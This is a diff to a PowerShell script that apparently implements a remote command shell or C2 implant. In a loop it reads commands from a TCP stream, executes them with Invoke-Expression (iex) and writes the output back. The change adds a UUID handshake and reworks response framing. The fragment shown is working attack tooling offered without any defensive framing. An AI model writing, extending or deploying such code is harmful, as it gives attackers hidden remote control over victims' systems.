@@ -27,6 +27,12 @@ while (1) {
     # Initialize byte stream.
     $stream = $client.GetStream();
 
+    # Send UUID as initial message.
+    $out = $uuid
+    $out = [System.BitConverter]::GetBytes($out.Length) + $out
+    $stream.Write($out, 0, $out.Length);
+    $stream.Flush();
+
     # Keep session established.
     while (1) {
 
@@ -48,11 +54,9 @@ while (1) {
         # Run command.
         $result = (iex $cmd 2>&1 | Out-String)
 
-        # Construct response.
-        $out = $uuid + [System.Text.Encoding]::UTF8.GetBytes($result);
+        # Send response.
+        $out = [System.Text.Encoding]::UTF8.GetBytes($result);
         $out = [System.BitConverter]::GetBytes($out.Length) + $out
-
-        # Write response to stream.
         $stream.Write($out, 0, $out.Length);
         $stream.Flush();
     }
